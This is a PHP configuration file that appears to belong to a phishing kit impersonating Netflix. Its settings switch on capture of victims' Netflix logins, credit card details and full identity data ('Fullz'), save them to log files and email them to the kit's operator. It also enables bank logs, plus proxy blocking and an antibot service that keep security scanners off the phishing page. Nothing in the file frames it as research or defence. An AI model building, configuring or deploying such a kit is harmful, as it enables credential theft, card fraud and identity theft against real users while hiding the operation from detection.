<?php
session_start();
require 'security/index.php';


// ======================== Your Info ======================== \\
$email = "";                    // Your Email Address
$resultsName = '';  //This will help to protect your results (rather than txt files generic name and easy to find) & also give some 
                                //personalisation on your results




// ======================== Features ======================== \\
$saveLogin = '1';               // 0 = Off // 1 = On // If on, your captured NetFlix Logins will be saved into text files, located within Logs folder
$sendLogin = '1';               // 0 = Off // 1 = On // If on, your captured NetFlix Logins will be sent to your email

$saveCC = '1';                  // 0 = Off // 1 = On // If on, your captured NetFlix Logins with CC Details will be saved into text files, located within Logs folder
$sendCC = '1';                  // 0 = Off // 1 = On // If on, your captured NetFlix Logins with CC Details will be sent to your email

$saveFullz = '1';                  // 0 = Off // 1 = On // If on, your captured NetFlix Logins with Fullz will be saved into text files, located within Logs folder
$sendFullz = '1';                  // 0 = Off // 1 = On // If on, your captured NetFlix Logins with Fullz will be sent to your email

$bankLogs = '1';




// ======================== AntiBots ======================== \\
$proxyBlock = '1'; // Turns on/off proxy blocker (people cant access page)

//This page uses multiple AntiBot features, including antibot.pw
//To enable AntiBot.pw please go to security folder, and edit the index.php
//In there you will need to enter your api key where specified